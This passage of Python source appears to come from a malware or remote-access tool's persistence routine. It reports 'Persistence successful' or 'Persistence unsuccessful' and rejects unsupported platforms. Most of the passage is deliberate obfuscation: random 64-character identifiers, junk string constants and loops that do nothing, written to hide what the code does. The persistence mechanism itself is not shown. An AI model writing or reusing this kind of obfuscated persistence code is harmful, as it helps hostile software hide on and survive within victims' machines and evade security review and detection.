                if LApAAQfWosXHiRWTgcJdnvCtmWkyYZUbSYboVHEGwpyvtAWdtPHUIODQJJsadKRR != QpKElLCPlJcNhytHCflSrKrVrUxurCbPptQtOoBhtwgJjYOyuutqsIOnpuKYZBFA:
                    IwcRQuzNgHcNhhZNVUqMEWKJGTlWcTywVNvsUVoUnfKBOftnVPnWYdeQggAuGoMT = IwcRQuzNgHcNhhZNVUqMEWKJGTlWcTywVNvsUVoUnfKBOftnVPnWYdeQggAuGoMT
                else:
                    cIeHeyjGewrTVdwkGYbhvAwgprRAqrpVpMDQROsHyRYVIaurSgUodwwOXlgBVydq = eapRSbEAUYaxUJnEPxXwwoxZfAMzCtruARJuhldHVGnEgIgzYPuOFjKzYjgraKCE
        else:
            QpKElLCPlJcNhytHCflSrKrVrUxurCbPptQtOoBhtwgJjYOyuutqsIOnpuKYZBFA = eapRSbEAUYaxUJnEPxXwwoxZfAMzCtruARJuhldHVGnEgIgzYPuOFjKzYjgraKCE
            eapRSbEAUYaxUJnEPxXwwoxZfAMzCtruARJuhldHVGnEgIgzYPuOFjKzYjgraKCE = cIeHeyjGewrTVdwkGYbhvAwgprRAqrpVpMDQROsHyRYVIaurSgUodwwOXlgBVydq
            if QpKElLCPlJcNhytHCflSrKrVrUxurCbPptQtOoBhtwgJjYOyuutqsIOnpuKYZBFA == eapRSbEAUYaxUJnEPxXwwoxZfAMzCtruARJuhldHVGnEgIgzYPuOFjKzYjgraKCE:
                for LApAAQfWosXHiRWTgcJdnvCtmWkyYZUbSYboVHEGwpyvtAWdtPHUIODQJJsadKRR in eapRSbEAUYaxUJnEPxXwwoxZfAMzCtruARJuhldHVGnEgIgzYPuOFjKzYjgraKCE:
                    if LApAAQfWosXHiRWTgcJdnvCtmWkyYZUbSYboVHEGwpyvtAWdtPHUIODQJJsadKRR == QpKElLCPlJcNhytHCflSrKrVrUxurCbPptQtOoBhtwgJjYOyuutqsIOnpuKYZBFA:
                        QpKElLCPlJcNhytHCflSrKrVrUxurCbPptQtOoBhtwgJjYOyuutqsIOnpuKYZBFA = eapRSbEAUYaxUJnEPxXwwoxZfAMzCtruARJuhldHVGnEgIgzYPuOFjKzYjgraKCE
                    else:
                        QpKElLCPlJcNhytHCflSrKrVrUxurCbPptQtOoBhtwgJjYOyuutqsIOnpuKYZBFA = cIeHeyjGewrTVdwkGYbhvAwgprRAqrpVpMDQROsHyRYVIaurSgUodwwOXlgBVydq
        success, mymKsXxasSbzfVMCGuceyVVZuSdrHMZRzNeBdFblbaqelLHcCTAKueiCejgoYNxY = TisLpOxQhwkNIIlNUZMJSAyvZKWASELaGNGZEKNqRpcVAWeOnIYZrmwmHMbPLMKc()
    else:
        HXLmUKsCuMgzmuUWvttHsOVHXvMXNVBHTrWAFenVtewcUQAruaaUxgZqStCUMjHI = 'vZXwZVjwukwLEpevLyILNjyYFegjykbEyrUEKtUIpkJhQcBaACTNQivPEblgMciR'
        yGxROPCjEqJswQppKcoWqilfnEJyurBKtbhrjzyYBGdUliroKSIBGNCFQmaGUCdt = 'YTVjTCeLmIsuZjwqQdkkYwwoincLCBFtdQNmUlwvMrYxVFHZJNqPdeWpoYvugAfQ'
        tMGyvJQpqTWNNZrNWJtmHMrCbmLozPnHXFaSqHuAkAqMbKcRwFqJHXeOIvhNuJNm = 'ncAiIlloQeBYIjCDEeItIGKTOswEeLqsUxZoTYViVdlWNdgvIyjEDElfZmQBvYLH'
        UvmpfuglFpfPbiOKRCierLnXqPckyIwYZOXqQxxvYYPywTtaPXeIwEVXvldopate = 'PAzvUXJQwvXmZmngtWAZGIiaNLVPCgHddvzlGnmhUioAbCyIfmCrybUPBNeHazVn'
        EUkzTTfzVoWxbPfDouDfgKZaNiVggHwmgHPIIlWZlxMiuqlHmfHrFPjmPivfpIAd = 'YcRZuatnmBVagoGhEMVqIpiraLJBNMhgWJKLBfThoyMGqxezaJdjFNrEGgHpUexj'
        mtnDrpyQfCkkyYhMOyQImFfqeLWOfPMpGuyIOwPrkkNdtQsttlrRQHXABwKEbHtD = 'OEpQygDBtfsjLZceqvAUFNLtTLGdlzyzhkqrKIRWbUXUzKnhbfNdjWlWIsrjRbSc'
        if HXLmUKsCuMgzmuUWvttHsOVHXvMXNVBHTrWAFenVtewcUQAruaaUxgZqStCUMjHI != UvmpfuglFpfPbiOKRCierLnXqPckyIwYZOXqQxxvYYPywTtaPXeIwEVXvldopate:
            yGxROPCjEqJswQppKcoWqilfnEJyurBKtbhrjzyYBGdUliroKSIBGNCFQmaGUCdt = tMGyvJQpqTWNNZrNWJtmHMrCbmLozPnHXFaSqHuAkAqMbKcRwFqJHXeOIvhNuJNm
            for mtnDrpyQfCkkyYhMOyQImFfqeLWOfPMpGuyIOwPrkkNdtQsttlrRQHXABwKEbHtD in UvmpfuglFpfPbiOKRCierLnXqPckyIwYZOXqQxxvYYPywTtaPXeIwEVXvldopate:
                if mtnDrpyQfCkkyYhMOyQImFfqeLWOfPMpGuyIOwPrkkNdtQsttlrRQHXABwKEbHtD != tMGyvJQpqTWNNZrNWJtmHMrCbmLozPnHXFaSqHuAkAqMbKcRwFqJHXeOIvhNuJNm:
                    yGxROPCjEqJswQppKcoWqilfnEJyurBKtbhrjzyYBGdUliroKSIBGNCFQmaGUCdt = yGxROPCjEqJswQppKcoWqilfnEJyurBKtbhrjzyYBGdUliroKSIBGNCFQmaGUCdt
                else:
                    EUkzTTfzVoWxbPfDouDfgKZaNiVggHwmgHPIIlWZlxMiuqlHmfHrFPjmPivfpIAd = HXLmUKsCuMgzmuUWvttHsOVHXvMXNVBHTrWAFenVtewcUQAruaaUxgZqStCUMjHI
        else:
            tMGyvJQpqTWNNZrNWJtmHMrCbmLozPnHXFaSqHuAkAqMbKcRwFqJHXeOIvhNuJNm = HXLmUKsCuMgzmuUWvttHsOVHXvMXNVBHTrWAFenVtewcUQAruaaUxgZqStCUMjHI
            HXLmUKsCuMgzmuUWvttHsOVHXvMXNVBHTrWAFenVtewcUQAruaaUxgZqStCUMjHI = EUkzTTfzVoWxbPfDouDfgKZaNiVggHwmgHPIIlWZlxMiuqlHmfHrFPjmPivfpIAd
            if tMGyvJQpqTWNNZrNWJtmHMrCbmLozPnHXFaSqHuAkAqMbKcRwFqJHXeOIvhNuJNm == HXLmUKsCuMgzmuUWvttHsOVHXvMXNVBHTrWAFenVtewcUQAruaaUxgZqStCUMjHI:
                for mtnDrpyQfCkkyYhMOyQImFfqeLWOfPMpGuyIOwPrkkNdtQsttlrRQHXABwKEbHtD in HXLmUKsCuMgzmuUWvttHsOVHXvMXNVBHTrWAFenVtewcUQAruaaUxgZqStCUMjHI:
                    if mtnDrpyQfCkkyYhMOyQImFfqeLWOfPMpGuyIOwPrkkNdtQsttlrRQHXABwKEbHtD == tMGyvJQpqTWNNZrNWJtmHMrCbmLozPnHXFaSqHuAkAqMbKcRwFqJHXeOIvhNuJNm:
                        tMGyvJQpqTWNNZrNWJtmHMrCbmLozPnHXFaSqHuAkAqMbKcRwFqJHXeOIvhNuJNm = HXLmUKsCuMgzmuUWvttHsOVHXvMXNVBHTrWAFenVtewcUQAruaaUxgZqStCUMjHI
                    else:
                        tMGyvJQpqTWNNZrNWJtmHMrCbmLozPnHXFaSqHuAkAqMbKcRwFqJHXeOIvhNuJNm = EUkzTTfzVoWxbPfDouDfgKZaNiVggHwmgHPIIlWZlxMiuqlHmfHrFPjmPivfpIAd
        return 'Error, platform unsupported.'
    if success:
        kQCPfRWKAQlTiSjinSJGBPvoUEIQRLbuXRLWJWmFIlNTJkOmhPZHVdgogOZLkFET = 'LTnIZapucxhrMWKTHEqyGJtystsqISmayWmkQwSHpjTZutgqNaOAEVwSJzKVEGJJ'
        ThBZEUXgOVHgJkAOtUKuwCqGvtSkeWXcagzllZuuHfbCyUhaqCWgWEDneqUQJmfS = 'ChMGkuCbbpClmkPtogjACcPqSTHUUxhIWWTSOyNKWQHgYRnwQzimMwqyVgvtXjXB'
        bTHSErSxCKVCbJXaIxsAHattuCQOBbUOJEqEAbcEUrTXbKKiSyInjCQxnwoiHVvX = 'bmkTMblVFYlyzVZpHVtujzYzadHMbgdojQUlieNNoQluQMoXYcuWTJUkhCJAqdao'
        jPJAvXfYGneLimAdVSVTfYviSOoBfBzpRPxHLnaJTVrabUcpWeibfvMoZXEVSjec = 'EBGmQiDlwalzzWAKratVUKCiJcoaJIFCvuLxvFXFdJEvZEXCibFyqpRQYfXtznzN'
        GphIKPJDKYJRqmvWFnYeNDUpkCPnDjdFQQFDZxuImBZJOUvdVRunzOOyJcafyUXP = 'YVFWuOTkGMHkLQhDXsgiiONuusWmzVRFForqxABtaJKpOJTbrVFaDpDjdqiUiwtT'
        VwyVPpGMqsnhmaZPwSQjXHDkvjAtMNEXMmGvuDNkLKwdqABtALSuqQBdkHowYXYu = 'kGaLsVthtlkNlQZWBZNGjDsreygKRkMkkekcqCgkrerDdTZNdhFOEqPxpkLHVOrx'
        if bTHSErSxCKVCbJXaIxsAHattuCQOBbUOJEqEAbcEUrTXbKKiSyInjCQxnwoiHVvX == jPJAvXfYGneLimAdVSVTfYviSOoBfBzpRPxHLnaJTVrabUcpWeibfvMoZXEVSjec:
            for VwyVPpGMqsnhmaZPwSQjXHDkvjAtMNEXMmGvuDNkLKwdqABtALSuqQBdkHowYXYu in GphIKPJDKYJRqmvWFnYeNDUpkCPnDjdFQQFDZxuImBZJOUvdVRunzOOyJcafyUXP:
                if VwyVPpGMqsnhmaZPwSQjXHDkvjAtMNEXMmGvuDNkLKwdqABtALSuqQBdkHowYXYu == jPJAvXfYGneLimAdVSVTfYviSOoBfBzpRPxHLnaJTVrabUcpWeibfvMoZXEVSjec:
                    GphIKPJDKYJRqmvWFnYeNDUpkCPnDjdFQQFDZxuImBZJOUvdVRunzOOyJcafyUXP = kQCPfRWKAQlTiSjinSJGBPvoUEIQRLbuXRLWJWmFIlNTJkOmhPZHVdgogOZLkFET
                else:
                    jPJAvXfYGneLimAdVSVTfYviSOoBfBzpRPxHLnaJTVrabUcpWeibfvMoZXEVSjec = ThBZEUXgOVHgJkAOtUKuwCqGvtSkeWXcagzllZuuHfbCyUhaqCWgWEDneqUQJmfS
        wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd = 'Persistence successful, {}.'.format(mymKsXxasSbzfVMCGuceyVVZuSdrHMZRzNeBdFblbaqelLHcCTAKueiCejgoYNxY)
    else:
        uBGlRmnFFOkEaMNvtVORdugveYMVCHzCRizkimqVxHcLsRaMeQTjEKjxfRFooojN = 'nzqmxeDpNrRptWZMLXnMXQBWYiAPTIAFLhjCUozJjgMerQEoheQUSbNVibWWCgLp'
        sRhRgzWAIAOxApfytIXdSQadXFIxWZvFJDYOnnjeogiSdndltkLOnvxKJVbKHNfB = 'JyChTCIJlVKayrayusWVqYiELKmMsyTaroynsBTCXYUTzJwhSaybLZBIDIjqFUeH'
        ZSeoaXpcjzEjYIABZXTZqDhycoRbmqXRKqYIJMzJwWZQllKLFOiuiRbPgygETfLW = 'tzcQAEDVwMGGSScioQlrXGWxSzuwbkGWXQlzyiOmIxHvwpfCYJwNtAiFCuTfNLsX'
        rSThHvFnRxJfwksjxEGiRSuVqAJPwrkYWvNOqqmLhaCSGyfWVjZTTXqRKLAKGLAy = 'ROtTjhfqKfGZVZeYdFZknuWlYZAnOGNNXNExEdIPAbhxoUrqeUrmWqUbWkmiWDbz'
        PCizExnGyvmBinkAokHtRzPCpxnXOHasaJHTgSMCTuIPOVhaqPNkFYZBLOctPJYa = 'PITJVkuRzDCYGvDJYerifqmgjSAjYZAHkOXCuDfvZvSpQxdwHwsLlPLONWlNtztV'
        tAtoFwVJxzsAyINpFSXujXKtgJZwRvJswQyHVIPfYThERziriWjOPmjkEVcqdbim = 'gOERRhCDXeREvRJikzVphmaXpEUDYEtsbcYEYnXKxdnarsbYjrIBMemsrnaggbhC'
        if uBGlRmnFFOkEaMNvtVORdugveYMVCHzCRizkimqVxHcLsRaMeQTjEKjxfRFooojN != rSThHvFnRxJfwksjxEGiRSuVqAJPwrkYWvNOqqmLhaCSGyfWVjZTTXqRKLAKGLAy:
            sRhRgzWAIAOxApfytIXdSQadXFIxWZvFJDYOnnjeogiSdndltkLOnvxKJVbKHNfB = ZSeoaXpcjzEjYIABZXTZqDhycoRbmqXRKqYIJMzJwWZQllKLFOiuiRbPgygETfLW
            for tAtoFwVJxzsAyINpFSXujXKtgJZwRvJswQyHVIPfYThERziriWjOPmjkEVcqdbim in rSThHvFnRxJfwksjxEGiRSuVqAJPwrkYWvNOqqmLhaCSGyfWVjZTTXqRKLAKGLAy:
                if tAtoFwVJxzsAyINpFSXujXKtgJZwRvJswQyHVIPfYThERziriWjOPmjkEVcqdbim != ZSeoaXpcjzEjYIABZXTZqDhycoRbmqXRKqYIJMzJwWZQllKLFOiuiRbPgygETfLW:
                    sRhRgzWAIAOxApfytIXdSQadXFIxWZvFJDYOnnjeogiSdndltkLOnvxKJVbKHNfB = sRhRgzWAIAOxApfytIXdSQadXFIxWZvFJDYOnnjeogiSdndltkLOnvxKJVbKHNfB
                else:
                    PCizExnGyvmBinkAokHtRzPCpxnXOHasaJHTgSMCTuIPOVhaqPNkFYZBLOctPJYa = uBGlRmnFFOkEaMNvtVORdugveYMVCHzCRizkimqVxHcLsRaMeQTjEKjxfRFooojN
        else:
            ZSeoaXpcjzEjYIABZXTZqDhycoRbmqXRKqYIJMzJwWZQllKLFOiuiRbPgygETfLW = uBGlRmnFFOkEaMNvtVORdugveYMVCHzCRizkimqVxHcLsRaMeQTjEKjxfRFooojN
            uBGlRmnFFOkEaMNvtVORdugveYMVCHzCRizkimqVxHcLsRaMeQTjEKjxfRFooojN = PCizExnGyvmBinkAokHtRzPCpxnXOHasaJHTgSMCTuIPOVhaqPNkFYZBLOctPJYa
            if ZSeoaXpcjzEjYIABZXTZqDhycoRbmqXRKqYIJMzJwWZQllKLFOiuiRbPgygETfLW == uBGlRmnFFOkEaMNvtVORdugveYMVCHzCRizkimqVxHcLsRaMeQTjEKjxfRFooojN:
                for tAtoFwVJxzsAyINpFSXujXKtgJZwRvJswQyHVIPfYThERziriWjOPmjkEVcqdbim in uBGlRmnFFOkEaMNvtVORdugveYMVCHzCRizkimqVxHcLsRaMeQTjEKjxfRFooojN:
                    if tAtoFwVJxzsAyINpFSXujXKtgJZwRvJswQyHVIPfYThERziriWjOPmjkEVcqdbim == ZSeoaXpcjzEjYIABZXTZqDhycoRbmqXRKqYIJMzJwWZQllKLFOiuiRbPgygETfLW:
                        ZSeoaXpcjzEjYIABZXTZqDhycoRbmqXRKqYIJMzJwWZQllKLFOiuiRbPgygETfLW = uBGlRmnFFOkEaMNvtVORdugveYMVCHzCRizkimqVxHcLsRaMeQTjEKjxfRFooojN
                    else:
                        ZSeoaXpcjzEjYIABZXTZqDhycoRbmqXRKqYIJMzJwWZQllKLFOiuiRbPgygETfLW = PCizExnGyvmBinkAokHtRzPCpxnXOHasaJHTgSMCTuIPOVhaqPNkFYZBLOctPJYa
        wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd = 'Persistence unsuccessful, {}.'.format(mymKsXxasSbzfVMCGuceyVVZuSdrHMZRzNeBdFblbaqelLHcCTAKueiCejgoYNxY)
    return wSrTwRJdclLssJPATXwHOPEeNkLkZGKbPIrgaiRYjOdWoqXbsmlkSQeastSnUYtd
